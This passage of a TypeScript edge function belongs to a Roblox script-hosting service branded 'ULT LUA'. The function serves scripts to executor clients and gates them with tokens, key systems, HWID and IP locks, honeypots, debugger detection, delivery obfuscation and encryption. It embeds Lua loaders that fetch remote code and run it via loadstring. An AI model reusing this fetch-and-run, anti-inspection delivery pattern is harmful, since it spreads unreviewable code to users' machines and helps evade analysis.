if _r then loadstring(_r)() end`;
        console.log(`[get-paste] KEY_VALID: returning bypass redirect for protected paste ${paste.id}`);
        return new Response(`KEY_VALID_SCRIPT:\n${redirectScript}`, { status: 200, headers: textHeaders });
      }
      
      // For non-protected pastes, return raw content directly
      return new Response(`KEY_VALID_SCRIPT:\n${paste.content}`, { status: 200, headers: textHeaders });
    }

    if (shouldRedirectToDiscord()) {
      const discordClientId = Deno.env.get('DISCORD_APPLICATION_ID');
      if (discordClientId) {
        console.log(`[get-paste] Redirecting browser to Discord OAuth slug=${slug} ip=${clientIp}`);
        return new Response(null, {
          status: 302,
          headers: { ...corsHeaders, 'Location': `${supabaseUrl}/functions/v1/discord-identify?action=start&slug=${slug}` }
        });
      }
    }

    if (isLikelyBrowser && !isRobloxRequest && !uid && !tk) {
      if (paste.ip_tracking_enabled) {
        console.log(`[get-paste] browser visitor logged slug=${slug} ip=${clientIp}`);
        await logAccess(null, 'browser');
      }
      if (paste.hide_code) {
        return new Response('', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
      }
      if (!paste.protection_enabled && !paste.public_protection) {
        return new Response(paste.content, { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
      }
      return new Response('-- This script is protected. Execute via loadstring() in Roblox.', {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    // ===== ANTI-FETCH PROTECTION =====
    // When anti_fetch_enabled, block raw fetches that have NO execution context.
    // Allow through: browser requests, requests with uid (loadstring execution), 
    // requests with tk (token-based auth), requests with kbt (key bypass token).
    // This means loadstring(game:HttpGet("url"))() still works because:
    //   - First request (no uid) returns loader/key system GUI (those paths are handled BELOW)
    //   - Second request from loader has uid+tk, so it passes through here
    // But setclipboard(game:HttpGet("url")) gets blocked because it never sends uid/tk.
    // NOTE: We only block here for NON-protected, NON-keysystem pastes.
    // Protected pastes already return a loader (not raw content) when uid is missing.
    // Key system pastes return the key GUI when uid is missing.

    // Validate non-browser requests for protected pastes
    if ((paste.protection_enabled || paste.public_protection || paste.hide_code) && !isLikelyBrowser) {
      if (!validationResult.valid) {
        console.log(`[get-paste] BLOCKED ${validationResult.reason} for protected paste: ${slug} from ${clientIp}`);
        return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
      }
    }

    // ===== GLOBAL ANTI-FETCH PROTECTION =====
    // This runs for ALL paste types (protected, public-protection, non-protected).
    // When anti_fetch_enabled is on and there's no execution context (no uid, no tk, no kbt, no key),
    // return a mini loader. setclipboard copies "-- Protected by ULT LUA" (useless).
    // loadstring executes the loader which re-fetches with uid to get the real content.
    if (paste.anti_fetch_enabled && !uid && !tk && !kbt && !keyParam && !isLikelyBrowser) {
      console.log(`[get-paste] ANTI-FETCH: returning mini loader for slug=${slug} ip=${clientIp}`);
      const encodedMiniUrl = encodeUrlForLua(baseUrl, '_ep');
      const miniLoader = `-- Protected by ULT LUA
${encodedMiniUrl}
local _p = game:GetService("Players").LocalPlayer
if not _p then _p = game:GetService("Players").PlayerAdded:Wait() end
local _u = _ep .. "?slug=${slugStr}&uid=" .. tostring(_p.UserId) .. "&_=" .. tostring(tick())
local _r; pcall(function() if request then local resp = request({Url=_u,Method="GET"}) if resp then _r = resp.Body end end end)
if not _r then pcall(function() _r = game:HttpGet(_u) end) end
if _r then loadstring(_r)() end`;
      return new Response(miniLoader, { status: 200, headers: textHeaders });
    }

    // ===== NON-PROTECTED PASTE (no protection, no public_protection) =====
    // CRITICAL FIX v10.1: Non-protected pastes now use the same 2-phase encrypted flow.
    // Previously returned raw paste.content — allowing curl with spoofed Roblox UA to steal code.
    // Now: Phase 1 (no tk) → return encrypted loader. Phase 2 (with valid tk) → return encrypted content.
    if (!paste.protection_enabled && !paste.public_protection) {
      const keyPanel = await getPreferredKeyPanel();
      
      if (keyPanel && !tk && !kbt && !isLikelyBrowser && !keyParam) {
        console.log(`[get-paste] Returning key system GUI for paste: ${paste.id} panel: ${keyPanel.name}`);
        const { data: panelDetails } = await supabase.from('control_panels').select('logo_url').eq('id', keyPanel.id).single();
        const gui = generateKeySystemGui(slugStr, baseUrl, keyPanel.name, '188, 134, 255', panelDetails?.logo_url || undefined);
        return new Response(gui, { status: 200, headers: textHeaders });
      }
      
      if (paste.game_restriction_enabled && gid && pid) {
        const { data: gameBindings } = await supabase.from('paste_game_bindings').select('game_id').eq('paste_id', paste.id);
        if (gameBindings && gameBindings.length > 0) {
          const allowedGameIds = gameBindings.map(b => b.game_id);
          const isAllowed = allowedGameIds.includes(gid) || allowedGameIds.includes(pid);
          if (!isAllowed) {
            return new Response(generateKickPlain('This script is not supported on this game'), {
              status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
            });
          }
        }
      }

      // Phase 2: Token validated — serve encrypted content (NEVER raw)
      if (uid && tk && ts && /^\d+$/.test(uid)) {
        const timestamp = parseInt(ts);
        const now = Math.floor(Date.now() / 1000);
        if (isNaN(timestamp) || Math.abs(now - timestamp) > 180) {
          return await respondWithFreshLoader();
        }
        
        const { data: tokenData, error: tokenError } = await supabase
          .from('paste_execution_tokens')
          .select('*')
          .eq('token', tk)
          .eq('paste_id', paste.id)
          .maybeSingle();
        
        if (tokenError || !tokenData) return await respondWithFreshLoader();
        if (tokenData.used_at) return await respondWithFreshLoader();
        if (new Date(tokenData.expires_at) < new Date()) return await respondWithFreshLoader();
        // v10.4: IP binding — reject mismatched tokens but DON'T auto-ban on first occurrence
        // Legitimate users can have IP changes (VPN, mobile network, ISP rotation) between the two requests
        if (tokenData.bound_ip && tokenData.bound_ip !== clientIp) {
          console.log(`[get-paste] TOKEN IP MISMATCH: bound=${tokenData.bound_ip} actual=${clientIp} slug=${slug}`);
          const isBanWorthy = shouldBanForIpMismatch(clientIp);
          logThreat('token_ip_mismatch', clientIp, uid, null, {
            bound_ip: tokenData.bound_ip, actual_ip: clientIp, slug,
            action: isBanWorthy ? 'token_rejected_auto_ban' : 'token_rejected_retry',
          }, isBanWorthy ? 'high' : 'low', isBanWorthy);
          if (isBanWorthy) {
            autoBanNewIp(clientIp, 'repeated_token_theft_ip_mismatch', uid, null);
            return new Response('warn("[ULT] Access denied")', { status: 200, headers: textHeaders });
          }
          // Not ban-worthy yet — just give them a fresh loader with their CURRENT IP
          return await respondWithFreshLoader();
        }
        
        // Mark token as used
        await supabase.from('paste_execution_tokens')
          .update({ used_at: new Date().toISOString(), roblox_user_id: uid })
          .eq('id', tokenData.id).is('used_at', null);
        
        // v12: Protection checks for non-protected pastes too
        const v12NonProtResult = await applyV12Protections(paste, uid, clientIp, hwid, slug, tk, supabase, baseUrl);
        if (v12NonProtResult) return v12NonProtResult;

        logAccess(uid, 'execution', true).catch(() => {});
        supabase.from('paste_executions').insert({ paste_id: paste.id, roblox_user_id: uid }).then(() => {}).catch(() => {});
        
        fireWebhookAlert(paste, uid, clientIp, hwid, 'execution');

        let nonProtContent = paste.content;
        if (paste.crash_detection_enabled) nonProtContent = wrapWithCrashDetection(nonProtContent);
        if (paste.obfuscation_on_delivery) nonProtContent = applyDeliveryObfuscation(nonProtContent);

        // Return ENCRYPTED content — never raw
        const key = `${slug}:${tk}:ULTv9:${uid}:${entropy || '0'}`;
        const trustLevel = getTrustScore(clientIp);
        // v10.2: Always use chunked encryption (anti-loadstring-hook)
        return new Response(chunkEncrypt(nonProtContent, key), { status: 200, headers: textHeaders });
      }
      
      // Phase 1: No token — serve the loader (which will call back with uid+tk)
      // This is the ONLY path for initial requests. curl gets a loader, not raw code.
      if (!isLikelyBrowser && !isRobloxRequest) {
        console.log(`[get-paste] BLOCKED: non-roblox non-browser on non-prot paste slug=${slug} ip=${clientIp}`);
        return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
      }
      
      // Browser visitors
      if (isLikelyBrowser && !isRobloxRequest) {
        if (paste.ip_tracking_enabled) await logAccess(null, 'browser');
        if (paste.hide_code) {
          return new Response('', { status: 200, headers: textHeaders });
        }
        // For browsers on non-protected pastes without hide_code, show a message
        return new Response('-- Execute via loadstring() in Roblox.', { status: 200, headers: textHeaders });
      }
      
      // Roblox client — serve loader that will call back with token for encrypted content
      return await respondWithFreshLoader();
    }

    // ===== PROTECTED PASTE - needs loader =====
    if (!uid || !ts || !tk) {
      // ===== KEY BYPASS TOKEN - comes from key system after validation =====
      if (kbt && uid && /^\d+$/.test(uid)) {
        // Validate the bypass token
        const { data: bypassData } = await supabase
          .from('paste_execution_tokens')
          .select('*')
          .eq('token', kbt)
          .eq('paste_id', paste.id)
          .is('used_at', null)
          .maybeSingle();

        if (bypassData && new Date(bypassData.expires_at) > new Date()) {
          // v10.4: Validate IP binding on bypass token — don't auto-ban on first mismatch
          if (bypassData.bound_ip && bypassData.bound_ip !== clientIp) {
            console.log(`[get-paste] KBT IP MISMATCH: bound=${bypassData.bound_ip} actual=${clientIp}`);
            const isBanWorthy = shouldBanForIpMismatch(clientIp);
            logThreat('kbt_ip_mismatch', clientIp, uid, null, { bound_ip: bypassData.bound_ip, slug }, isBanWorthy ? 'high' : 'low', isBanWorthy);
            if (isBanWorthy) {
              autoBanNewIp(clientIp, 'repeated_kbt_token_theft', uid, null);
              return new Response('warn("[ULT] Access denied")', { status: 200, headers: textHeaders });
            }
            // Give fresh loader with current IP
            return await respondWithFreshLoader();
          }
          // Mark bypass token as used
          await supabase.from('paste_execution_tokens')
            .update({ used_at: new Date().toISOString() })
            .eq('id', bypassData.id);

          // Now serve the normal protection loader (completely separate from key system)
          console.log(`[get-paste] KBT_VALID: serving protection loader for uid=${uid} paste=${paste.id}`);
          const newToken = generateToken();
          const sessionSecret = generateSessionSecret(clientIp, Date.now());
          const serverNonce = generateServerNonce();
          const trustLevel = getTrustScore(clientIp);
          await supabase.from('paste_execution_tokens').insert({
            paste_id: paste.id, roblox_user_id: uid, token: newToken,
            expires_at: new Date(Date.now() + 30000).toISOString(),
            bound_ip: clientIp,
          });
          const loader = generateLoader(slugStr, baseUrl, newToken, sessionSecret, {
            showConsoleFeedback: paste.show_loading_bar !== false,
            serverNonce,
            trustLevel,
          });
          return new Response(loader, { status: 200, headers: textHeaders });
        } else {
          console.log(`[get-paste] KBT_INVALID: expired or used bypass token for paste ${paste.id}`);
          return new Response(generateKickPlain('Session expired, please try again'), { status: 200, headers: textHeaders });
        }
      }

      if (isLikelyBrowser && !isRobloxRequest) {
        await logAccess(null, 'browser');
        return new Response('', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
      }

      const keyPanel = await getPreferredKeyPanel();
      
      if (keyPanel) {
        console.log(`[get-paste] Returning key system GUI for protected paste: ${paste.id} panel: ${keyPanel.name}`);
        const { data: panelDetails } = await supabase.from('control_panels').select('logo_url').eq('id', keyPanel.id).single();
        const gui = generateKeySystemGui(slugStr, baseUrl, keyPanel.name, '188, 134, 255', panelDetails?.logo_url || undefined);
        return new Response(gui, { status: 200, headers: textHeaders });
      }

      // Block spoofed uid (serve honeypot, no auto-ban)
      if (uid && /^\d+$/.test(uid) && parseInt(uid) < 1000 && parseInt(uid) !== 0) {
        console.log(`[get-paste] BLOCKED: spoofed uid=${uid} slug=${slug} ip=${clientIp}`);
        logThreat('spoofed_uid', clientIp, uid, null, {
          slug, user_agent: userAgent.substring(0, 200), action: 'honeypot_served_no_ban',
        }, 'medium', true);
        return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
      }

      // ===== Before serving the protection loader, verify request legitimacy =====
      // A non-browser, non-Roblox request should NEVER get the loader — serve honeypot, no ban
      if (!isLikelyBrowser && !isRobloxRequest) {
        console.log(`[get-paste] BLOCKED: non-roblox non-browser requesting loader slug=${slug} ip=${clientIp} ua="${userAgent.substring(0, 80)}"`);
        logThreat('unknown_client_loader', clientIp, uid || null, null, {
          slug, user_agent: userAgent.substring(0, 200), action: 'honeypot_served_no_ban',
        }, 'medium', true);
        return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
      }

      const newToken = generateToken();
      const sessionSecret = generateSessionSecret(clientIp, Date.now());
      const serverNonce = generateServerNonce();
      const trustLevel = getTrustScore(clientIp);
      // v12.2: Non-blocking token insert
      supabase.from('paste_execution_tokens').insert({
        paste_id: paste.id, roblox_user_id: '0', token: newToken,
        expires_at: new Date(Date.now() + 30000).toISOString(),
        bound_ip: clientIp,
      }).then(() => {}).catch(() => {});
      const loader = generateLoader(slugStr, baseUrl, newToken, sessionSecret, {
        showConsoleFeedback: paste.show_loading_bar !== false,
        serverNonce,
        trustLevel,
      });
      return new Response(loader, { status: 200, headers: textHeaders });
    }

    if (!/^\d+$/.test(uid)) {
      return new Response(generateKickEncrypted('Invalid user ID', slug, tk, uid), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    const timestamp = parseInt(ts);
    const now = Math.floor(Date.now() / 1000);
    if (isNaN(timestamp) || Math.abs(now - timestamp) > 180) {
      return await respondWithFreshLoader();
    }

    if (!isRobloxRequest && userAgent.includes('axios')) {
      const strikes = (suspiciousIps.get(clientIp)?.strikes || 0) + 2;
      suspiciousIps.set(clientIp, { strikes, lastStrike: Date.now() });
      return new Response(generateKickEncrypted('Access denied - Invalid client', slug, tk, uid), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    // v9+v10: Validate entropy proof + DNA + quantum + stack depth
    if (entropy && snonce) {
      const entropyNum = parseInt(entropy);
      if (entropyNum === 0) {
        // Zero entropy = no real RenderStepped happened
        updateTrustScore(clientIp, -15);
        console.log(`[get-paste] SUSPICIOUS: zero entropy from ${clientIp}`);
      }
    }
    
    // v10: Validate DNA hash (should be non-zero for real game sessions)
    if (dna) {
      const dnaNum = parseInt(dna);
      if (dnaNum === 0 || isNaN(dnaNum)) {
        updateTrustScore(clientIp, -10);
        console.log(`[get-paste] SUSPICIOUS: zero/invalid DNA from ${clientIp}`);
      }
    }
    
    // v10: Validate stack depth (abnormally deep = debugger)
    if (stackDepth) {
      const sdNum = parseInt(stackDepth);
      if (sdNum > 15) {
        updateTrustScore(clientIp, -20);
        logThreat('deep_stack_detected', clientIp, uid, null, {
          stack_depth: sdNum, slug, action: 'trust_degraded',
        }, 'medium', true);
      }
    }
    
    // v10: Log watermark for leak tracing
    if (watermarkId) {
      // Store watermark-to-user mapping for leak detection
      console.log(`[get-paste] v10: wm=${watermarkId} uid=${uid} ip=${clientIp} dna=${dna || 'none'} qt=${quantumToken || 'none'}`);
    }

    const { data: tokenData, error: tokenError } = await supabase
      .from('paste_execution_tokens')
      .select('*')
      .eq('token', tk)
      .eq('paste_id', paste.id)
      .maybeSingle();

    if (tokenError || !tokenData) return await respondWithFreshLoader();
    if (tokenData.used_at) {
      const strikes = (suspiciousIps.get(clientIp)?.strikes || 0) + 1;
      suspiciousIps.set(clientIp, { strikes, lastStrike: Date.now() });
      return await respondWithFreshLoader();
    }
    if (new Date(tokenData.expires_at) < new Date()) return await respondWithFreshLoader();
    
    // v10.4: IP binding validation — reject but don't auto-ban on first mismatch
    if (tokenData.bound_ip && tokenData.bound_ip !== clientIp) {
      console.log(`[get-paste] PROTECTED TOKEN IP MISMATCH: bound=${tokenData.bound_ip} actual=${clientIp} slug=${slug} uid=${uid}`);
      const isBanWorthy = shouldBanForIpMismatch(clientIp);
      logThreat('protected_token_ip_mismatch', clientIp, uid, null, {
        bound_ip: tokenData.bound_ip, actual_ip: clientIp, slug,
        action: isBanWorthy ? 'token_rejected_auto_ban' : 'token_rejected_retry',
      }, isBanWorthy ? 'critical' : 'low', isBanWorthy);
      if (isBanWorthy) {
        autoBanNewIp(clientIp, 'repeated_token_theft_protected', uid, null);
        return new Response('warn("[ULT] Access denied")', { status: 200, headers: textHeaders });
      }
      return await respondWithFreshLoader();
    }

    // v12.2: Non-blocking token mark-as-used
    supabase
      .from('paste_execution_tokens')
      .update({ used_at: new Date().toISOString(), roblox_user_id: uid })
      .eq('id', tokenData.id)
      .is('used_at', null)
      .then(() => {}).catch(() => {});

    if (paste.game_restriction_enabled && gid && pid) {
      const { data: gameBindings } = await supabase.from('paste_game_bindings').select('game_id').eq('paste_id', paste.id);
      if (gameBindings && gameBindings.length > 0) {
        const allowedGameIds = gameBindings.map(b => b.game_id);
        if (!allowedGameIds.includes(gid) && !allowedGameIds.includes(pid)) {
          return new Response(generateKickEncrypted('This script is not supported on this game', slug, tk, uid), {
            status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
          });
        }
      }
    }

    // v9: Determine trust level and whether to poison
    const trustLevel = getTrustScore(clientIp);
    const shouldPoison = trustLevel < 30;

    if (paste.public_protection) {
      const { data: blacklistEntry } = await supabase
        .from('paste_access_control')
        .select('*')
        .eq('paste_id', paste.id)
        .eq('roblox_user_id', uid)
        .eq('access_type', 'blacklist')
        .maybeSingle();

      const nowMs = Date.now();
      const expiresAtMs = blacklistEntry?.expires_at ? Date.parse(blacklistEntry.expires_at) : null;
      const expiresValid = typeof expiresAtMs === "number" && Number.isFinite(expiresAtMs);
      const isBlacklisted = !!blacklistEntry && (
        blacklistEntry.is_eternal || !blacklistEntry.expires_at || (expiresValid && (expiresAtMs as number) > nowMs)
      );

      if (isBlacklisted) {
        return new Response(generateKickEncrypted('You are blacklisted', slug, tk, uid), {
          status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
        });
      }

      // v11: HWID verification for public protection pastes
      const pubProtMode = paste.protection_mode || 'whitelist';
      if (pubProtMode === 'hwid' || pubProtMode === 'both') {
        if (hwid && hwid.length >= 4) {
          const { data: existingLock } = await supabase
            .from('paste_hwid_locks')
            .select('*')
            .eq('paste_id', paste.id)
            .eq('roblox_user_id', uid)
            .maybeSingle();

          if (existingLock) {
            if (existingLock.hwid !== hwid) {
              return new Response(generateKickEncrypted('HWID mismatch - locked to another device', slug, tk, uid), {
                status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
              });
            }
            await supabase.from('paste_hwid_locks').update({ updated_at: new Date().toISOString() }).eq('id', existingLock.id);
          } else {
            await supabase.from('paste_hwid_locks').insert({ paste_id: paste.id, roblox_user_id: uid, hwid }).catch(() => {});
          }
        }
      }

      // ===== v12: NEW PROTECTION CHECKS (public protection path) =====
      const v12PubResult = await applyV12Protections(paste, uid, clientIp, hwid, slug, tk, supabase, baseUrl);
      if (v12PubResult) return v12PubResult;

      logAccess(uid, 'execution', true).catch(() => {});
      supabase.from('paste_executions').insert({ paste_id: paste.id, roblox_user_id: uid }).then(() => {}).catch(() => {});
      console.log(`Public protection access granted: ${uid} for paste: ${paste.id}`);
      
      fireWebhookAlert(paste, uid, clientIp, hwid, 'execution');

      let pubContent = paste.content;
      if (paste.crash_detection_enabled) pubContent = wrapWithCrashDetection(pubContent);
      if (paste.obfuscation_on_delivery) pubContent = applyDeliveryObfuscation(pubContent);

      const key = `${slug}:${tk}:ULTv9:${uid}:${entropy || '0'}`;
      
      // v10.2: Chunked encryption (anti-loadstring-hook)
      return new Response(chunkEncrypt(pubContent, key), { status: 200, headers: textHeaders });
    }

    const { data: accessList } = await supabase
      .from('paste_access_control')
      .select('*')
      .eq('paste_id', paste.id)
      .eq('roblox_user_id', uid);

    const nowMs = Date.now();
    const isBlacklisted = accessList?.some((entry) => {
      if (entry.access_type !== 'blacklist') return false;
      if (entry.is_eternal) return true;
      if (!entry.expires_at) return true;
      const expiresAtMs = Date.parse(entry.expires_at);
      return Number.isFinite(expiresAtMs) && expiresAtMs > nowMs;
    });

    if (isBlacklisted) {
      return new Response(generateKickEncrypted('You are blacklisted', slug, tk, uid), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    const hasWhitelist = (accessList ?? []).some((e) => e.access_type === 'whitelist');
    const hasValidWhitelist = (accessList ?? []).some((entry) => {
      if (entry.access_type !== 'whitelist') return false;
      if (entry.is_eternal) return true;
      if (!entry.expires_at) return true;
      const expiresAtMs = Date.parse(entry.expires_at);
      return Number.isFinite(expiresAtMs) && expiresAtMs > nowMs;
    });

    if (!hasWhitelist) {
      return new Response(generateKickEncrypted('Not whitelisted', slug, tk, uid), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    if (!hasValidWhitelist) {
      return new Response(generateKickEncrypted('Your whitelist time has expired', slug, tk, uid), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    // ===== v13: MANDATORY IDENTITY VERIFICATION =====
    // Always bind HWID to UserId for ALL protected pastes, regardless of protection mode.
    // This prevents UserId spoofing — if someone fakes a whitelisted UserId with Players.LocalPlayer hook,
    // their HWID won't match the real user's HWID.
    const protectionMode = paste.protection_mode || 'whitelist';
    
    if (hwid && hwid.length >= 4) {
      // HWID available — always verify it
      const { data: existingLock } = await supabase
        .from('paste_hwid_locks')
        .select('*')
        .eq('paste_id', paste.id)
        .eq('roblox_user_id', uid)
        .maybeSingle();

      if (existingLock) {
        // HWID lock exists — verify it matches
        if (existingLock.hwid !== hwid) {
          console.log(`[get-paste] HWID_MISMATCH: uid=${uid} expected=${existingLock.hwid.substring(0,8)}... got=${hwid.substring(0,8)}... slug=${slug}`);
          logThreat('hwid_mismatch', clientIp, uid, null, {
            expected_hwid: existingLock.hwid.substring(0, 16),
            actual_hwid: hwid.substring(0, 16),
            slug,
            reason: 'possible_userid_spoof',
          }, 'high', false);
          return new Response(generateKickEncrypted('HWID mismatch - this script is locked to another device. Contact the script owner to reset your HWID.', slug, tk, uid), {
            status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
          });
        }
        // HWID matches — update last seen
        await supabase.from('paste_hwid_locks')
          .update({ updated_at: new Date().toISOString() })
          .eq('id', existingLock.id);
        console.log(`[get-paste] HWID_VALID: uid=${uid} hwid=${hwid.substring(0,8)}... slug=${slug}`);
      } else {
        // No lock yet — create one (first execution binds HWID)
        const { error: insertError } = await supabase
          .from('paste_hwid_locks')
          .insert({
            paste_id: paste.id,
            roblox_user_id: uid,
            hwid: hwid,
          });
        if (insertError) {
          console.error(`[get-paste] HWID_INSERT_ERROR:`, insertError);
        } else {
          console.log(`[get-paste] HWID_LOCKED: uid=${uid} hwid=${hwid.substring(0,8)}... slug=${slug} (first execution)`);
        }
      }
    } else if (protectionMode === 'hwid' || protectionMode === 'both') {
      // HWID mode explicitly required but no HWID sent
      console.log(`[get-paste] HWID_MISSING: uid=${uid} slug=${slug} mode=${protectionMode}`);
      return new Response(generateKickEncrypted('Your executor does not support HWID locking. Please use an executor with gethwid() support.', slug, tk, uid), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    } else {
      // No HWID available and mode is 'whitelist' — use IP binding as fallback
      // Track IP per UserId to detect spoofing
      const { data: userIpLocks } = await supabase
        .from('paste_access_logs')
        .select('ip_address')
        .eq('paste_id', paste.id)
        .eq('roblox_user_id', uid)
        .eq('access_type', 'execution')
        .order('created_at', { ascending: false })
        .limit(5);
      
      if (userIpLocks && userIpLocks.length >= 3) {
        // Check if current IP is completely new and different from all previous IPs
        const previousIps = new Set(userIpLocks.map(l => l.ip_address));
        if (!previousIps.has(clientIp)) {
          // New IP for this UserId — log as suspicious but allow (could be legit VPN change)
          // However, if the IP is also associated with a DIFFERENT UserId on the same paste, block it
          const { data: ipOtherUsers } = await supabase
            .from('paste_access_logs')
            .select('roblox_user_id')
            .eq('paste_id', paste.id)
            .eq('ip_address', clientIp)
            .eq('access_type', 'execution')
            .neq('roblox_user_id', uid)
            .limit(1);
          
          if (ipOtherUsers && ipOtherUsers.length > 0) {
            // This IP was already used by a DIFFERENT user on the same paste
            // Very likely UserId spoofing
            console.log(`[get-paste] USERID_SPOOF_DETECTED: uid=${uid} ip=${clientIp} also used by uid=${ipOtherUsers[0].roblox_user_id} slug=${slug}`);
            logThreat('userid_spoof', clientIp, uid, null, {
              slug,
              other_uid: ipOtherUsers[0].roblox_user_id,
              reason: 'same_ip_different_userid',
            }, 'critical', false);
            return new Response(generateKickEncrypted('Identity verification failed. Your session has been flagged.', slug, tk, uid), {
              status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
            });
          }
        }
      }
    }

    // ===== v12: NEW PROTECTION CHECKS =====
    const v12Result = await applyV12Protections(paste, uid, clientIp, hwid, slug, tk, supabase, baseUrl);
    if (v12Result) return v12Result;

    logAccess(uid, 'execution', true).catch(() => {});
    supabase.from('paste_executions').insert({ paste_id: paste.id, roblox_user_id: uid }).then(() => {}).catch(() => {});
    console.log(`Access granted: ${uid} for paste: ${paste.id}`);

    // v12: Send webhook alert if enabled
    fireWebhookAlert(paste, uid, clientIp, hwid, 'execution');

    let finalContent = paste.content;
    if (paste.crash_detection_enabled) finalContent = wrapWithCrashDetection(finalContent);
    if (paste.obfuscation_on_delivery) finalContent = applyDeliveryObfuscation(finalContent);

    const key = `${slug}:${tk}:ULTv9:${uid}:${entropy || '0'}`;
    
    // v10.2: Chunked encryption (anti-loadstring-hook)
    return new Response(chunkEncrypt(finalContent, key), {
      status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
    });

  } catch (error) {
    console.error('Error:', error);
    return new Response('warn("[ULT] Server error - please retry")', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
  }
});
